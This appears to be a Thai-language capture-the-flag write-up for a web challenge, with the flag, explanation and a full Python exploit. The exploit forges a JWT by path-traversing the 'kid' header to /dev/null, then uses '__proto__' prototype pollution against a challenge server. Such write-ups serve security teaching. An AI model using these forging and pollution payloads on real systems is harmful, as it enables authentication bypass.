# Subzero Station (Web, 100pts)

**Flag:** `DELTA{4bs0lut3_z3r0_h4s_b33n_r34ch3d_succe55fully}`

## โจทย์

สถานีวิจัยอุณหภูมิต่ำ — ต้องทำให้อุณหภูมิถึง -273.15°C (absolute zero) ผ่าน JWT forgery + prototype pollution

## ขั้นตอน

### 1. หา JWT Secret

`GET /robots.txt` พบ:

```
# secret: iced_out_research_station_secret_2024
```

### 2. Path Traversal ใน kid

Source code:

```javascript
const secret = fs.readFileSync(decoded.header.kid);
```

ส่ง `kid: "../../dev/null"` → secret เป็น **empty string**

### 3. Forge JWT

```python
import jwt

token = jwt.encode(
    {"username": "admin", "iat": 0, "admin": True},
    "",
    algorithm="HS256",
    headers={"kid": "../../dev/null"}
)
```

### 4. Prototype Pollution

ฟังก์ชัน merge vulnerable:

```javascript
function merge(a, b) {
  for (let key in b) {
    a[key] = b[key];
  }
}
```

ส่งไปที่ `/calibrate`:

```json
{
  "__proto__": {
    "temperature": -273.15
  }
}
```

ทุก object จะมี `temperature = -273.15`

### 5. ขอ Flag

```python
r = requests.get(url + "/admin", cookies={"session": token})
print(r.text)
```

## หลักการ

**JWT kid path traversal:** `kid` ปกติใช้อ้างอิง key แต่โค้ดใช้ `readFileSync` → ชี้ไป `/dev/null` ได้ empty string

**Prototype Pollution:** การ merge object โดย unsafe ทำให้แก้ `Object.prototype` → property มีผลกับทุก object

## Full Exploit

```python
import jwt, requests

BASE = "http://13.238.150.105:32525"

token = jwt.encode(
    {"username": "admin", "iat": 0, "admin": True},
    "",
    algorithm="HS256",
    headers={"kid": "../../dev/null"}
)

requests.post(f"{BASE}/calibrate", cookies={"session": token},
              json={"__proto__": {"temperature": -273.15}})

r = requests.get(f"{BASE}/admin", cookies={"session": token})
print(r.text)
```

## สรุป

- JWT `kid` path traversal → `../../dev/null`
- Prototype pollution ผ่าน `__proto__`
- Chain 2 ช่องโหว่ bypass authentication + business logic
- ตรวจสอบ `robots.txt` เสมอ
